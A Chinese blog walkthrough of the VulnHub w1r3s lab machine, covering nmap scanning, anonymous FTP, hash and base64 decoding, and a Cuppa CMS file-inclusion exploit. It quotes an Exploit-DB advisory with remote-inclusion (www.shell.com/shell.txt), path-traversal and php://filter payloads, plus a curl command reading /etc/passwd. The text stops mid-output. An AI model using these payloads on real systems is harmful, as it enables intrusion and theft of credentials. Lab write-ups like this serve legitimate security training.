---
title: VulnHub-w1r3s-1.0.1
slug: vulnhubw1r3s101-zep7pg
url: /post/vulnhubw1r3s101-zep7pg.html
date: '2025-03-03 14:41:56+08:00'
lastmod: '2025-05-07 21:33:23+08:00'
toc: true
categories:
  - penetration
isCJKLanguage: true
---

# VulnHub-w1r3s-1.0.1

载入虚拟机后是一个未知账户，需要密码，流程开始

## 信息搜集

### 查找主机

先查看自身主机，发现本地的ip为192.168.152.131，所在网段应该就是192.168.200.0/24

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ ip a  
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:82:4e:1f brd ff:ff:ff:ff:ff:ff
    inet 192.168.152.131/24 brd 192.168.152.255 scope global dynamic noprefixroute eth0
       valid_lft 1414sec preferred_lft 1414sec
    inet6 fe80::3021:1752:2678:7550/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

因此开始扫描该网段

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ sudo nmap -sn 192.168.152.0/24         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 22:32 EDT
Nmap scan report for 192.168.152.1
Host is up (0.00020s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.152.2
Host is up (0.00016s latency).
MAC Address: 00:50:56:FB:F0:8A (VMware)
Nmap scan report for 192.168.152.132
Host is up (0.00022s latency).
MAC Address: 00:0C:29:60:2F:0A (VMware)
Nmap scan report for 192.168.152.254
Host is up (0.00032s latency).
MAC Address: 00:50:56:E9:C0:09 (VMware)
Nmap scan report for 192.168.152.131
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.92 seconds
```

**注意点**

-sn参数是仅ping，而不进行端口扫描，-sP参数已废弃

使用arp-scan命令也能达到同样的效果

```plain
┌──(kali㉿kali)-[~/桌面]
└─$  sudo arp-scan -l   
Interface: eth0, type: EN10MB, MAC: 00:0c:29:82:4e:1f, IPv4: 192.168.152.131
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.152.1   00:50:56:c0:00:08       VMware, Inc.
192.168.152.2   00:50:56:fb:f0:8a       VMware, Inc.
192.168.152.132 00:0c:29:60:2f:0a       VMware, Inc.
192.168.152.254 00:50:56:e9:c0:09       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.004 seconds (127.74 hosts/sec). 4 responded
```

**注意**

可以利用靶机上下线，确定自己的靶机IP

### 端口扫描

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ sudo nmap --min-rate 10000 -p- 192.168.152.132   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 22:55 EDT
Nmap scan report for 192.168.152.132
Host is up (0.00018s latency).
Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 00:0C:29:60:2F:0A (VMware)

Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds
```

**注意**

-p是指定端口参数，而-p-是指全端口扫描，防止存在信息遗漏

又学到一手，细节太多了，tql

**小技巧**

如果扫描过程中存在大量端口，可以的处理方法

首先在上述扫描的时候可以先将扫描参数保存

```plain
sudo nmap --min-rate 10000 -p- 192.168.152.132  -oA [路径]
```

提取分割

```plain
grep open [路径] | awk -F '/' '{print $1}' | paste -sd ','
```

指定变量

```plain
ports=grep open [路径] | awk -F '/' '{print $1}' | paste -sd ','
echo $ports
```

### 详细信息扫描

#### TCP扫描

* -sT：指定TCP协议
* -sV：探测各服务的版本
* -sC：使用默认脚本
* -O：探测各操作系统的版本

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ sudo nmap -sT -sV -sC -O -p21,22,80,3306 192.168.152.132
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 23:10 EDT
Nmap scan report for 192.168.152.132
Host is up (0.00048s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.152.131
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 00:0C:29:60:2F:0A (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.9 (97%), Linux 5.1 (94%), Linux 4.10 (93%), Linux 3.4 - 3.10 (93%), Linux 3.10 (93%), Linux 3.13 - 3.16 (92%), Linux 4.4 (92%), Synology DiskStation Manager 5.2-5644 (92%), Linux 3.16 - 4.6 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.51 seconds
```

#### UDP扫描

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ sudo nmap -sU --top-ports 20 192.168.152.132 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 23:18 EDT
Nmap scan report for 192.168.152.132
Host is up (0.00050s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
MAC Address: 00:0C:29:60:2F:0A (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds
```

#### vuln脚本扫描

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ sudo nmap -script=vuln -p21,22,80,3306 192.168.152.132
Nmap scan report for 192.168.152.132
Host is up (0.00039s latency).
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /wordpress/wp-login.php: Wordpress login page.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|   
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
3306/tcp open  mysql
MAC Address: 00:0C:29:60:2F:0A (VMware)

Nmap done: 1 IP address (1 host up) scanned in 321.65 seconds
```

必要时尝试IPV6

## FTP渗透

### 匿名登录

在信息搜集的过程中，nmap扫描到ftp开放，可以使用匿名登录

```plain
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

用户名就为Anonymous，密码为空

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ ftp 192.168.152.132
Connected to 192.168.152.132.
220 Welcome to W1R3S.inc FTP service.
Name (192.168.152.132:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

选择切换binary模式

```plain
ftp> binary
200 Switching to Binary mode.
```

**注意**

不进行切换到binary模式，下载的可执行文件可能损坏

### 信息泄露

#### content

进入content文件查看

```plain
ftp> ls
229 Entering Extended Passive Mode (|||45116|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
226 Directory send OK.
ftp> cd content
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||45048|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            29 Jan 23  2018 01.txt
-rw-r--r--    1 ftp      ftp           165 Jan 23  2018 02.txt
-rw-r--r--    1 ftp      ftp           582 Jan 23  2018 03.txt
226 Directory send OK.
```

对查看的文件进行下载操作

```plain
ftp> mget *.txt
mget 01.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||46201|)
150 Opening BINARY mode data connection for 01.txt (29 bytes).
100% |*************************************************************|    29       35.17 KiB/s    00:00 ETA
226 Transfer complete.
29 bytes received in 00:00 (18.66 KiB/s)
mget 02.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||44162|)
150 Opening BINARY mode data connection for 02.txt (165 bytes).
100% |*************************************************************|   165      254.55 KiB/s    00:00 ETA
226 Transfer complete.
165 bytes received in 00:00 (117.27 KiB/s)
mget 03.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||49788|)
150 Opening BINARY mode data connection for 03.txt (582 bytes).
100% |*************************************************************|   582      888.06 KiB/s    00:00 ETA
226 Transfer complete.
582 bytes received in 00:00 (435.52 KiB/s)
```

**小技巧**

避免交互式确认

```plain
ftp> prompt
Interactive mode off.
```

#### docs

```plain
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||47572|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
226 Directory send OK.
ftp> cd docs
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||43184|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           138 Jan 23  2018 worktodo.txt
226 Directory send OK.
```

#### new-employees

```plain
ftp> cd new-employees
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||43732|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           155 Jan 28  2018 employee-names.txt
226 Directory send OK.
ftp> get employee-names.txt
local: employee-names.txt remote: employee-names.txt
229 Entering Extended Passive Mode (|||45279|)
150 Opening BINARY mode data connection for employee-names.txt (155 bytes).
100% |*************************************************************|   155      137.35 KiB/s    00:00 ETA
226 Transfer complete.
155 bytes received in 00:00 (82.13 KiB/s)
```

所有内容查看并下载完毕，可以退出ftp

### 整理破解

先查看数字文本中的信息

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ cat *.txt  
New FTP Server For W1R3S.inc
#
#
#
#
#
#
#
#
01ec2d8fc11c493b25029fb1f47f39ce
#
#
#
#
#
#
#
#
#
#
#
#
#
SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==
############################################
___________.__              __      __  ______________________   _________    .__           
\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  
  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  < \_____  \     |  |/    \_/ ___\ 
  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ 
  |____|   |___|  /\___  >   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  >
                \/     \/         \/                \/       \/        \/  \/         \/     \/ 
The W1R3S.inc employee list

Naomi.W - Manager
Hector.A - IT Dept
Joseph.G - Web Design
Albert.O - Web Design
Gina.L - Inventory
Rico.D - Human Resources

        ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡

....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ
```

可以看到存在两个密码

有一段结尾为\=\=，很明显可能与base64有关，尝试解密

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-dkV2C3g7URAlPxL-20250303144204-i41tfzu.png)​

```plain
It is easy, but not that easy..
```

还有一段尝试识别

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ hash-identifier                                                   
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 01ec2d8fc11c493b25029fb1f47f39ce

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
--------------------------------------------------
```

尝试md5解密

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-6TQdeiPYsD4KLVh-20250303144204-f3reivn.png)​

```plain
This is not a password
```

除两端疑似密文外，但是没有得到什么有价值的信息

可以看到还存在相关的员工列表，通过相关的搜集可能获得部分更高权限，得到相关的立足点

```plain
The W1R3S.inc employee list

Naomi.W - Manager
Hector.A - IT Dept
Joseph.G - Web Design
Albert.O - Web Design
Gina.L - Inventory
Rico.D - Human Resources
```

然后是一段明显是颠倒的信息，通过在线网站

[Upside Down Text | Flip Text, Type Upside Down, or Backwards Text](https://www.upsidedowntext.com/)

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-QfnGSkTIADLysR3-20250303144205-b55gtcz.png)​

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-zb9tBA3Plvj5Qio-20250303144205-8jl8gzu.png)​

## MySQL

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ mysql -h 192.168.152.132 -u root -p
Enter password: 
ERROR 1130 (HY000): Host '192.168.152.131' is not allowed to connect to this MySQL server
```

尝试空密码，但是很明显失败了

## Web渗透

当然，还有一个80端口，存在着web服务，是值得去尝试的

打开后是一个基本的ubuntu服务器的页面

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-BIfNnmwtHxF3PAj-20250303144205-8b8h6ph.png)​

进行目录爆破

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ dirsearch -u http://192.168.152.132:80/                                  

  _|. _ _  _  _  _ _|_    v0.4.3                                                     
 (_||| _) (/_(_|| (_| )                                                                                  
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/桌面/reports/http_192.168.152.132_80/__24-03-11_01-27-32.txt

Target: http://192.168.152.132/

[01:27:32] Starting:                                                                                
[01:27:33] 403 -  301B  - /.ht_wsr.txt                                  
[01:27:33] 403 -  304B  - /.htaccess.bak1                               
[01:27:33] 403 -  304B  - /.htaccess.orig                               
[01:27:33] 403 -  304B  - /.htaccess.save
[01:27:33] 403 -  304B  - /.htaccess_orig                               
[01:27:33] 403 -  302B  - /.htaccessBAK
[01:27:33] 403 -  302B  - /.htaccessOLD
[01:27:33] 403 -  306B  - /.htaccess.sample                             
[01:27:33] 403 -  305B  - /.htaccess_extra
[01:27:33] 403 -  302B  - /.htaccess_sc                                 
[01:27:33] 403 -  295B  - /.html
[01:27:33] 403 -  294B  - /.htm
[01:27:33] 403 -  303B  - /.htaccessOLD2
[01:27:33] 403 -  301B  - /.httr-oauth                                  
[01:27:33] 403 -  300B  - /.htpasswds
[01:27:33] 403 -  304B  - /.htpasswd_test                               
[01:27:34] 403 -  294B  - /.php                                         
[01:27:34] 403 -  295B  - /.php3                                        
[01:27:40] 301 -  326B  - /administrator  ->  http://192.168.152.132/administrator/
[01:27:40] 302 -    7KB - /administrator/  ->  installation/            
[01:27:40] 302 -    7KB - /administrator/index.php  ->  installation/   
[01:27:51] 301 -  323B  - /javascript  ->  http://192.168.152.132/javascript/
[01:28:01] 403 -  304B  - /server-status/                               
[01:28:01] 403 -  303B  - /server-status                                
[01:28:09] 200 -    1KB - /wordpress/wp-login.php                       
[01:28:09] 301 -    0B  - /wordpress/  ->  http://localhost/wordpress/
```

通过扫描明显看出存在wordpress和administrator的后台目录

因此下面也就是两个方向

### administrator

进入后发现应该是一个系统配置界面

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-yi4JbWmM6exZXgF-20250303144206-z660qao.png)​

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-47wUDMTedrtXcqK-20250303144206-3ls9i1w.png)​

**注意**

这里也存在一个问题，就是由于这个是一个靶机，所以对于相关操作没有太大心理压力，但是如果是真实环境，就可能担心会对系统及服务造成不可逆的损失，或者出现暴露，牢记，所有的测试要保证自身安全的情况下进行！

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-6lcTVkOa5qyUL29-20250303144206-p4042as.png)​

无法对管理员进行新的创建，因此考虑查找其他方向

#### 漏洞利用

查找相关漏洞

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ searchsploit cuppa cms                            
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion       | php/webapps/25971.txt
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

将相关exp信息进行下载

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ searchsploit cuppa -m 25971
[!] Could not find EDB-ID #


  Exploit: Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
      URL: https://www.exploit-db.com/exploits/25971
     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt
    Codes: OSVDB-94101
 Verified: True
File Type: C++ source, ASCII text, with very long lines (876)
Copied to: /home/kali/桌面/25971.txt
```

查看

```plain
# Exploit Title   : Cuppa CMS File Inclusion
# Date            : 4 June 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://www.cuppacms.com/
# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
# Version         : Beta
# Tested on       : Window and Linux

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /
  / XXXXXX /
 (________(
  `------'

####################################
VULNERABILITY: PHP CODE INJECTION
####################################

/alerts/alertConfigField.php (LINE: 22)

-----------------------------------------------------------------------------
LINE 22:
        <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------


#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-----------------------------------------------------------------------------

Base64 Encode Output:
-----------------------------------------------------------------------------
PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
-----------------------------------------------------------------------------

Base64 Decode Output:
-----------------------------------------------------------------------------
<?php
	class Configuration{
		public $host = "localhost";
		public $db = "cuppa";
		public $user = "root";
		public $password = "Db@dmin";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "";
		public $secure_login_redirect = "";
	}
?>
-----------------------------------------------------------------------------

Able to read sensitive information via File Inclusion (PHP Stream)

################################################################################################################
 Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################
```

随后，在根据上述信息，查看/etc/passwd

```plain
/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-PLhy8UgoW3N9bOj-20250303144206-l06wwcw.png)​

路径没问题，但是无法显示，因此在尝试下一种方法

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.152.132/administrator/alerts/alertConfigField.php 
<style>
    .new_content{
        position: fixed;
    }
    .alert_config_field{
        font-size:12px;
        background:#FFF;
        position:relative;
        border-radius: 3px;
        box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
        overflow:hidden;
        position:fixed;
        top:50%;
        left:50%;
        width:600px;
        height:440px;
        margin-left:-300px;
        margin-top:-220px;
    }
    .alert_config_top{
        position: relative;
        margin: 2px;
        margin-bottom: 0px;
        border: 1px solid #D2D2D2;
        background: #4489F8;
        overflow: auto;
        color:#FFF;
        font-size: 13px;
        padding: 7px 5px;
        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
    }
    .description_alert{
        position:relative;
        font-size:12px;
        text-shadow:0 1px #FFFFFF;
        font-weight: normal;
        padding: 5px 0px 5px 0px;
    }
    .btnClose_alert{
        position:absolute;
        top: 4px; right: 2px;
        width:22px;
        height:22px;
        cursor:pointer;
        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
        background-position: center;
        background-size: 13px;
    }
    .content_alert_config{
        position:relative;
        clear:both;
        margin: 2px;
        margin-top: 0px;
        height: 401px;
        padding: 10px;
        overflow: auto;
    }
</style>
<script>
        function CloseDefaultAlert(){
                cuppa.setContent({'load':false, duration:0.2});
        cuppa.blockade({'load':false, duration:0.2, delay:0.1});
        }
</script>
<div class="alert_config_field" id="alert">
    <div class="alert_config_top">
        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
    </div>
    <div id="content_alert_config" class="content_alert_config">
        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
